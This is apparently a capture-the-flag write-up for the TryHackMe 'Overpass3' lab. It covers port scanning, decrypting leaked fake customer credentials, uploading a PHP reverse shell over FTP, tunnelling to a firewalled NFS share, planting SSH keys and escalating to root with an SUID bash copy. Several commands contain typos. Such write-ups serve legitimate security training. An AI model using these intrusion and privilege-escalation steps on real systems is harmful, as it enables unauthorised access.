# Overpass3 - Adventures in Hosting

After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!  
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.

**Warning:** This box can take **around 5 minutes to boot** if you're not a subscriber. As a subscriber, it will be ready much faster.

I will review writeups for this room starting from 1 week after release. Before then, please do not publish writeups. Keeping them unlisted is fine but please do not share them.

You're welcome to stream this room **once writeups are approved.**  
Banner Image from [Nastuh Abootalebi](https://unsplash.com/@sunday_digital) on [Unsplash](https://unsplash.com/photos/yWwob8kwOCk)

### Web Flag

Start with an nmap scan of the target
`nmap -Pn -p- -T4 -sS -vv 10.10.145.20`
It shows 21, 22 and 80 open

Lets get some more details
`nmap -sS -Pn -p 21,22,80 -sV -T4 -sC -vv 10.10.145.20`

`21` is `vsftp 3.0.3`
`22` is `OpenSSH 8.0 (protocol 2.0)`
and `80` is `Apache 2.4.37`

FTP doesn't appear to be open for anonymous login

Visiting the website gives some details about the company, promising 5 9's uptime.  Looking at the source some comments also make light of the the 5 9's promise.  No robots.txt or security.txt

Perform some directory enumeration
`gobuster dir --url 10.10.145.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

The website has a `/backups` directory with a `backup.zip`.  Download this.  The file contains a priv.key and a xlsx.gpg document.  The `priv.key` file does indeed look like a PGP private key file, and the CustomerDetails.xlsx is encrypted

Import the priv key - `gpg --import priv.key`
Decrypt (`--output` must come before `--decrypt` because it just must!) - `gpg --output CustomerDetails.xlsx --decyrpt Customerdetails.xlsx.gpg`

Opening the file we see a list of usernames / passwords / CC details, etc.

|   |   |   |   |   |
|---|---|---|---|---|
|Customer Name|Username|Password|Credit card number|CVC|
|Par. A. Doxx|paradox|ShibesAreGreat123|4111 1111 4555 1142|432|
|0day Montgomery|0day|OllieIsTheBestDog|5555 3412 4444 1115|642|
|Muir Land|muirlandoracle|A11D0gsAreAw3s0me|5103 2219 1119 9245|737|

Using those credentials for SSH failed - Paradox needs keys, and 0day and muirlandoracle passwords didn't work.

We can logon to FTP as paradox it looks to be the website itself, with backup.zip file used earlier.

Upload a PHP reverse shell into the root ftp folder and navigate to it.  We get a  reverse shell.  Stabilise it `python -c 'import pty;pty.spawn("/bin/bash")'` fails as no python is installed.  `python3 -c 'import pty;pty.spawn("/bin/bash");'`

We are running as apache from root.
`cd ~` and we see a web.flag
`cat web.flag`

### User Flag

Attempting to run `sudo` asks for a password which we don't have.
Check `SUID` bit `find / -perm -u=s -type f 2>/dev/null`
Non found, no writable folders that look to give us privesx

`su paradox` and use the password we found earlier

We can logon as paradox. but paradox is not in the sudoers file

Lets grab paradox's .ssh keys while we are here.

Looking at `/etc/exports` we see `/home/james *(rw,fsid=0,sync,no_root_squash,insecure)`

Attempt to mount remotely failed from our device.
`mount -o rw $TARGETIP:/home/james /tmp/nfs` fail with `No route to host`
`mount -t nfs $TARGETIP:/home/james /tmp/nfs` fail with same error
`showmount -e %TARGETIP` reports `clnt_create: RPC: Unable to receive`

`ps -aux | grep nfs` we see NFS running, `ss`, `netcat` and `lsof` aren't installed.
`rpcinfo -p` shows NFS on port 2049.  Since we didn't find it on nmap we can assume it is blocked by a firewall.

This indicates we can only exploit NFS locally

We can use SSH tunnelling to do this attack.

Attempt to connect to the device using SSH with the keys we stole earlier, it fails auth.  We can create a new SSH key for our user.

```shel
ssh-keygen -f paradox
cat paradox.pub >> ~/.ssh/authorized_keys
```
Copy the paradox private key to your machine then connect wtih
```shell
chmod 600 paradox
ssh paradix@$TARGETIP -i paradox
```

It works
so connect to 2049:
`ssh paradox@$TARGET -i ~/paradox -L 2049:localhost:2049`

On the Attacker machine, run
`mkdir ~/nfs`
`sudo mount -v -t nfs localhost:/ ~/nfs/`

`cat ~/nfs/user.flag`

Answer: `thm{3693fc86661faa21f16ac9508a43e1ae}`

### Root flag

Add our key we already created to James list
Grab the public key from paradox then add it
`echo paradox.pub ~/nfs/.ssh/authorized_keys`

Try to ssh in as james using the paradox SSH key
`ssh -i paradox james@10.10.41.231`


Lets make a copy of bash with the SUID flag set
From James profile
`cp /usr/bin/bash ~`

From our machine
```
chown root:root ~/nfs/bash
chmod +s ~/nfs/bash
```

From James profile we should now have a bash binary with the SUID set and root as the owner.

`./bash -p`
`whoami`
`cat /root/root.flag`
